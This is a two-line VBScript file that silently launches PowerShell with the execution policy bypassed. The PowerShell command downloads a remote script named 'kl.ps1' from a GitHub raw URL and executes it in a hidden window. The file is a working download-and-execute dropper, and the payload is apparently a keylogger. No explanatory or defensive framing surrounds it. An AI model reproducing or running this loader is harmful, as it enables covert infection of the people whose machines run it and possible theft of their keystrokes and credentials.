Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -ep bypass -c ""IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/hamzza00/goat/refs/heads/main/kl.ps1'))""", 0, False
